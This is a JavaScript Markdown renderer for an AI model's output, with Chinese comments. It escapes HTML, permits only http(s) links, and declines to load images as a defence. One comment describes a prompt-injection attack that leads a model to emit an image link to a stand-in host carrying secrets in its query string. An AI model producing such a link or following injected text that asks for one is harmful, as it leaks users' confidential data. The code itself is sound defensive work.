/* 模型回复的 Markdown 渲染。零依赖，在 app.js 之前加载，对外只有 renderMarkdown(raw)。

   两段式：先对原始文本按行分块（代码块 / 标题 / 列表 / 表格 / 引用 / 段落），
   再逐块「转义 + 行内格式」。安全上只守一条：原文的每个字符都恰好经过一次 escapeHtml
   才进 HTML，标签只由这里生成——模型输出里的 <script> 原样显示成文字。

   刻意不支持：setext 标题（=== / --- 下划线）、4 空格缩进代码块（和嵌套列表冲突）、
   引用式链接、原始 HTML（只放行 <br>）、__粗体__（会把 __init__.py 渲染坏）。 */

(function (root) {
  "use strict";

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, (c) =>
      ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
  }

  /* ─────────────────────────── 块级 ─────────────────────────── */
  // 缩进一律宽松处理：没有缩进代码块，任何缩进都不改变一行「是什么块」
  const HEADING_RE = /^[ \t]*(#{1,6})[ \t]+(.+?)(?:[ \t]+#+)?[ \t]*$/;
  const HR_RE = /^[ \t]*([-*_])(?:[ \t]*\1){2,}[ \t]*$/;
  const QUOTE_RE = /^[ \t]*> ?/;
  const LIST_RE = /^([ \t]*)([-*+]|\d{1,9}[.)])([ \t]+|$)(.*)$/;
  const FENCE_RE = /^([ \t]*)(`{3,}|~{3,})(.*)$/;

  /* 行首空白的列数，tab 按 4 列对齐 */
  function indentOf(line) {
    let col = 0;
    for (const c of line) {
      if (c === " ") col++;
      else if (c === "\t") col += 4 - (col % 4);
      else break;
    }
    return col;
  }

  /* 去掉行首最多 n 列空白 */
  function dedent(line, n) {
    let col = 0;
    let k = 0;
    while (k < line.length && col < n) {
      if (line[k] === " ") col++;
      else if (line[k] === "\t") col += 4 - (col % 4);
      else break;
      k++;
    }
    return line.slice(k);
  }

  /* 反引号围栏的 info 里不能再有反引号：```a``` 是行内代码，不是代码块 */
  function fenceOpen(line) {
    const m = line.match(FENCE_RE);
    if (!m || (m[2][0] === "`" && m[3].includes("`"))) return null;
    return { indent: indentOf(m[1]), marker: m[2] };
  }

  function fenceCloses(line, marker) {
    const m = line.match(/^[ \t]*(`{3,}|~{3,})[ \t]*$/);
    return !!m && m[1][0] === marker[0] && m[1].length >= marker.length;
  }

  /* 表格一行拆成单元格：去掉首尾的 |，\| 是字面量，行内代码里的 | 不算分隔 */
  function splitRow(line) {
    let s = line.trim();
    if (s.startsWith("|")) s = s.slice(1);
    if (s.endsWith("|") && !s.endsWith("\\|")) s = s.slice(0, -1);
    const split = (codeAware) => {
      const cells = [];
      let cur = "";
      let inCode = false;
      for (let k = 0; k < s.length; k++) {
        const c = s[k];
        if (c === "\\" && s[k + 1] === "|") { cur += "|"; k++; continue; }
        if (c === "`" && codeAware) inCode = !inCode;
        if (c === "|" && !inCode) { cells.push(cur.trim()); cur = ""; continue; }
        cur += c;
      }
      cells.push(cur.trim());
      return { cells, balanced: !inCode };
    };
    const aware = split(true);
    // 落单的反引号会把后面的 | 全吞掉，这种情况退回按 | 硬切
    return aware.balanced ? aware.cells : split(false).cells;
  }

  function isTableStart(lines, i) {
    if (i + 1 >= lines.length || !lines[i].includes("|")) return false;
    const sep = lines[i + 1];
    if (!sep.includes("|") || !sep.includes("-") || !/^[\s|:-]+$/.test(sep)) return false;
    const cells = splitRow(sep);
    return cells.every((c) => /^:?-+:?$/.test(c)) && cells.length === splitRow(lines[i]).length;
  }

  function startsBlock(lines, i) {
    const line = lines[i];
    return !!fenceOpen(line) || HEADING_RE.test(line) || HR_RE.test(line)
      || QUOTE_RE.test(line) || LIST_RE.test(line) || isTableStart(lines, i);
  }

  /* 按行分块渲染。tight=true 用于紧凑列表项：段落不包 <p>，免得每一项都撑出段间距 */
  function renderBlocks(lines, tight) {
    const out = [];
    let i = 0;
    while (i < lines.length) {
      const line = lines[i];
      if (!line.trim()) { i++; continue; }
      let m;
      const fence = fenceOpen(line);
      if (fence) {
        // 没闭合就一直吃到结尾：流式输出时代码块还没写完，不能先按普通文本闪一下
        const body = [];
        for (i++; i < lines.length && !fenceCloses(lines[i], fence.marker); i++) {
          body.push(dedent(lines[i], fence.indent));
        }
        // 流式时文本常以换行结尾，没闭合的块末尾会多一个空行，关上后又消失，看着像跳了一下
        if (i >= lines.length && body.length && !body[body.length - 1].trim()) body.pop();
        i++;
        out.push(`<pre class="code"><code>${escapeHtml(body.join("\n"))}</code></pre>`);
      } else if ((m = line.match(HEADING_RE))) {
        const n = m[1].length;
        out.push(`<h${n}>${renderInline(m[2])}</h${n}>`);
        i++;
      } else if (HR_RE.test(line)) {  // 要在列表之前判断：「* * *」也长得像列表项
        out.push("<hr>");
        i++;
      } else if (QUOTE_RE.test(line)) {
        const inner = [];
        for (; i < lines.length && QUOTE_RE.test(lines[i]); i++) inner.push(lines[i].replace(QUOTE_RE, ""));
        out.push(`<blockquote>${renderBlocks(inner, false)}</blockquote>`);
      } else if (LIST_RE.test(line)) {
        i = renderList(lines, i, out);
      } else if (isTableStart(lines, i)) {
        i = renderTable(lines, i, out);
      } else {
        // 段落：到空行或下一个块开头为止。单个换行按 <br> 显示——中文里合并成空格很怪
        const para = [line.trim()];
        for (i++; i < lines.length && lines[i].trim() && !startsBlock(lines, i); i++) {
          para.push(lines[i].trim());
        }
        const html = para.map((l) => renderInline(l)).join("<br>");
        out.push(tight ? html : `<p>${html}</p>`);
      }
    }
    return out.join("");
  }

  /* 列表：比列表标记缩进更深的行都归当前项（去掉内容缩进后递归渲染），
     所以嵌套列表、项里的代码块都自然成立。项之间或项内出现空行就是松散列表。 */
  function renderList(lines, i, out) {
    const first = lines[i].match(LIST_RE);
    const base = indentOf(first[1]);
    const ordered = /\d/.test(first[2]);
    const items = [];
    let cur = null;
    let loose = false;
    let prevBlank = false;
    for (; i < lines.length; i++) {
      const line = lines[i];
      if (!line.trim()) { prevBlank = true; continue; }
      const ind = indentOf(line);
      const m = line.match(LIST_RE);
      if (m && ind <= base && /\d/.test(m[2]) === ordered && !HR_RE.test(line)) {
        if (prevBlank && cur) loose = true;
        const gap = Math.min(Math.max(m[3].length, 1), 4);
        cur = { lines: [m[4]], col: ind + m[2].length + gap };
        items.push(cur);
      } else if (cur && ind > base) {
        if (prevBlank) { loose = true; cur.lines.push(""); }
        cur.lines.push(dedent(line, cur.col));
      } else if (cur && !prevBlank && !startsBlock(lines, i)) {
        cur.lines.push(line);  // 懒惰续行：没缩进但紧跟着上一行，算同一段
      } else {
        break;
      }
      prevBlank = false;
    }

    const html = items.map((it) => {
      let body = it.lines;
      let box = "";
      const t = body[0].match(/^\[([ xX])\](?:[ \t]+(.*))?$/);
      if (t) {
        box = `<input type="checkbox" class="task-box" disabled${t[1] === " " ? "" : " checked"}>`;
        body = [t[2] || "", ...body.slice(1)];
      }
      let inner = renderBlocks(body, !loose);
      if (box) inner = inner.startsWith("<p>") ? `<p>${box}${inner.slice(3)}` : box + inner;
      return `<li${box ? ' class="task"' : ""}>${inner}</li>`;
    }).join("");

    const start = ordered ? parseInt(first[2], 10) : 1;
    out.push(ordered
      ? `<ol${start !== 1 ? ` start="${start}"` : ""}>${html}</ol>`
      : `<ul>${html}</ul>`);
    return i;
  }

  function renderTable(lines, i, out) {
    const head = splitRow(lines[i]);
    const aligns = splitRow(lines[i + 1]).map((c) => {
      const l = c.startsWith(":");
      const r = c.endsWith(":");
      return l && r ? "center" : r ? "right" : l ? "left" : "";
    });
    const cell = (tag, text, k) =>
      `<${tag}${aligns[k] ? ` style="text-align:${aligns[k]}"` : ""}>${renderInline(text)}</${tag}>`;
    const rows = [];
    // 表格到空行或不含 | 的行为止；单元格按表头列数补齐 / 截断
    for (i += 2; i < lines.length && lines[i].trim() && lines[i].includes("|"); i++) {
      const cells = splitRow(lines[i]);
      rows.push(`<tr>${head.map((_, k) => cell("td", cells[k] || "", k)).join("")}</tr>`);
    }
    out.push(`<div class="table-wrap"><table><thead><tr>${
      head.map((h, k) => cell("th", h, k)).join("")}</tr></thead>${
      rows.length ? `<tbody>${rows.join("")}</tbody>` : ""}</table></div>`);
    return i;
  }

  /* ─────────────────────────── 行内 ─────────────────────────── */
  // 占位符用 NUL 包住序号：模型输出里不会有 NUL（renderMarkdown 入口也会先删掉）
  const SLOT_RE = /\x00(\d+)\x00/g;
  const CODE_SPAN_RE = /(?<!`)(`+)(?!`)(.*?[^`])\1(?!`)/g;
  const ESCAPE_RE = /\\([!-/:-@[-`{-~])/g;
  const LINK_RE = /(!?)\[([^\]\n]*)\]\(\s*<?((?:[^()\s<>\x00]|\([^()\s\x00]*\))*)>?(?:\s+"[^"]*")?\s*\)/g;
  const ANGLE_URL_RE = /<(https?:\/\/[^\s<>]+)>/gi;
  // 裸网址只认 ASCII：中文紧跟在网址后面（「见https://a.com这里」）时不能被吞进去
  const BARE_URL_RE = /https?:\/\/[\w\-.~:/?#[\]@!$&'()*+,;=%]+/gi;

  /* 裸网址末尾的标点通常是句子的，不是网址的；右括号只在多出来时才剥 */
  function splitUrlTail(url) {
    let end = url.length;
    while (end > 0) {
      const c = url[end - 1];
      if (".,;:!?'*_~".includes(c)) { end--; continue; }
      if (c === ")" || c === "]") {
        const s = url.slice(0, end);
        const open = c === ")" ? "(" : "[";
        if (s.split(c).length > s.split(open).length) { end--; continue; }
      }
      break;
    }
    return [url.slice(0, end), url.slice(end)];
  }

  /* 链接只放行 http(s)，新标签页打开。其余协议（javascript:、相对路径）只显示文字：
     相对路径点了会把整个工作台页面跳走。
     图片不加载，只显示成链接——prompt injection 可以诱导模型输出
     ![](https://evil/?q=<机密>)，浏览器一渲染就把数据发出去了，不需要任何人点。
     labelHtml 是已经渲染好的 HTML。 */
  function safeLink(url, labelHtml, isImage = false) {
    const inner = isImage ? `图片：${labelHtml}` : labelHtml;
    if (!/^https?:\/\/./i.test(url)) {
      return `<span class="link-off" title="${escapeHtml(url)}">${inner}</span>`;
    }
    return `<a href="${escapeHtml(url)}" target="_blank" rel="noopener noreferrer">${inner}</a>`;
  }

  /* 粗体 / 斜体 / 删除线，作用在已经转义过的文本上（* _ ~ 不受转义影响） */
  function emphasis(s) {
    return s
      .replace(/\*\*\*(?=\S)(.+?)(?<=\S)\*\*\*/g, "<strong><em>$1</em></strong>")
      .replace(/\*\*(?=\S)(.+?)(?<=\S)\*\*/g, "<strong>$1</strong>")
      .replace(/\*(?=[^\s*])(.+?)(?<=[^\s*])\*/g, "<em>$1</em>")  // 2 * 3 * 4 不算
      .replace(/(^|[^\w])_(?=[^\s_])(.+?)(?<=[^\s_])_(?!\w)/g, "$1<em>$2</em>")  // snake_case 不算
      .replace(/~~(?=\S)(.+?)(?<=\S)~~/g, "<del>$1</del>");
  }

  /* 代码、转义字符、链接这些「内容不能再被加工」的片段先换成占位符存进 slots，
     剩下的文本整体转义后再做粗体 / 斜体，最后把占位符换回去。
     这样代码里的 ** 不会变粗体，网址里的 _ 不会变斜体。 */
  function renderInline(raw) {
    const slots = [];
    const keep = (html) => `\x00${slots.push(html) - 1}\x00`;
    const format = (s) => emphasis(escapeHtml(s)).replace(SLOT_RE, (_, n) => slots[Number(n)]);
    const s = raw
      .replace(CODE_SPAN_RE, (_, ticks, code) => {
        const c = /^ .*[^ ].* $/.test(code) ? code.slice(1, -1) : code;
        return keep(`<code>${escapeHtml(c)}</code>`);
      })
      .replace(ESCAPE_RE, (_, c) => keep(escapeHtml(c)))
      .replace(/<br\s*\/?>/gi, () => keep("<br>"))  // 模型爱在表格单元格里写 <br> 换行
      // 链接文字就地格式化，里面 `code` 的占位符在这里一起换回去
      .replace(LINK_RE, (_, bang, label, url) =>
        keep(safeLink(url, label ? format(label) : escapeHtml(url), bang === "!")))
      .replace(ANGLE_URL_RE, (_, url) => keep(safeLink(url, escapeHtml(url))))
      .replace(BARE_URL_RE, (hit) => {
        const [url, tail] = splitUrlTail(hit);
        return keep(safeLink(url, escapeHtml(url))) + tail;
      });
    return format(s);
  }

  function renderMarkdown(raw) {
    const text = String(raw ?? "").replace(/\r\n?/g, "\n").replace(/\x00/g, "");
    return renderBlocks(text.split("\n"), false);
  }

  root.renderMarkdown = renderMarkdown;
  // node 里 require 这个文件做测试（tests/serve/test_markdown.py）
  if (typeof module !== "undefined" && module.exports) module.exports = { renderMarkdown };
})(typeof window !== "undefined" ? window : globalThis);
